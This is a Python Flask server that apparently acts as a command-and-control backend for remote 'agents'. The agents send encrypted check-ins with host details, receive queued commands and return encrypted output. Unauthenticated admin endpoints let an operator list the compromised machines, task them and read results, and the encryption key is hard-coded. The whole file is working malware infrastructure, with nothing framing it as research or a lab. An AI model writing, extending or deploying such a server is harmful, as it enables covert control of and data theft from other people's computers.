from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import time
import ast
import sqlite3
import os

app = Flask(__name__)

# --- CONFIGURATION ---
SECRET_KEY = b'oWRo-pIVUqcUchAk9eKzNTGOTQcdr8l-xaoUVK3Vw_s='
cipher = Fernet(SECRET_KEY)
DB_PATH = "shadow.db"

# --- DATABASE LOGIC ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    # Table for agent status
    c.execute('''CREATE TABLE IF NOT EXISTS agents 
                 (id TEXT PRIMARY KEY, last_seen TEXT, info TEXT, remote_ip TEXT)''')
    # Table for queued tasks
    c.execute('''CREATE TABLE IF NOT EXISTS tasks 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, command TEXT)''')
    # Table for command results
    c.execute('''CREATE TABLE IF NOT EXISTS results 
                 (agent_id TEXT PRIMARY KEY, output TEXT)''')
    conn.commit()
    conn.close()

# CRITICAL: Initialize DB here so Gunicorn runs it on startup
init_db()

def decrypt_data(data):
    return cipher.decrypt(data.encode()).decode()

def encrypt_data(data):
    return cipher.encrypt(data.encode()).decode()

# --- AGENT ENDPOINTS ---

@app.route('/api/v1/status', methods=['POST'])
def status():
    try:
        encrypted_payload = request.get_data().decode()
        decrypted_meta = ast.literal_eval(decrypt_data(encrypted_payload))
        agent_id = decrypted_meta.get('pc', 'Unknown')
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # Update/Insert Agent
        c.execute("REPLACE INTO agents (id, last_seen, info, remote_ip) VALUES (?, ?, ?, ?)",
                  (agent_id, time.strftime("%H:%M:%S"), str(decrypted_meta), request.remote_addr))
        
        # Check for task
        c.execute("SELECT id, command FROM tasks WHERE agent_id = ? ORDER BY id ASC LIMIT 1", (agent_id,))
        task = c.fetchone()
        
        if task:
            task_id, command = task
            c.execute("DELETE FROM tasks WHERE id = ?", (task_id,))
            conn.commit()
            conn.close()
            return encrypt_data(command)
        
        conn.commit()
        conn.close()
        return encrypt_data("IDLE")
    except:
        return encrypt_data("IDLE")

@app.route('/api/v1/results', methods=['POST'])
def results():
    try:
        agent_id = request.form.get('id')
        output = decrypt_data(request.form.get('data'))
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        formatted_res = f"[{time.strftime('%H:%M:%S')}] {output}"
        c.execute("REPLACE INTO results (agent_id, output) VALUES (?, ?)", (agent_id, formatted_res))
        conn.commit()
        conn.close()
        return "OK"
    except:
        return "FAIL"

# --- CONTROLLER ENDPOINTS ---

@app.route('/admin/list', methods=['GET'])
def list_agents():
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("SELECT * FROM agents")
        rows = [dict(row) for row in c.fetchall()]
        conn.close()
        return jsonify(rows)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/admin/task', methods=['POST'])
def add_task():
    data = request.json
    aid, cmd = data.get('id'), data.get('cmd')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO tasks (agent_id, command) VALUES (?, ?)", (aid, cmd))
    conn.commit()
    conn.close()
    return "QUEUED"

@app.route('/admin/results/<agent_id>', methods=['GET'])
def get_results(agent_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT output FROM results WHERE agent_id = ?", (agent_id,))
    res = c.fetchone()
    if res:
        c.execute("DELETE FROM results WHERE agent_id = ?", (agent_id,))
        conn.commit()
        conn.close()
        return res[0]
    conn.close()
    return "No new results."

if __name__ == "__main__":
    # Local testing fallback
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
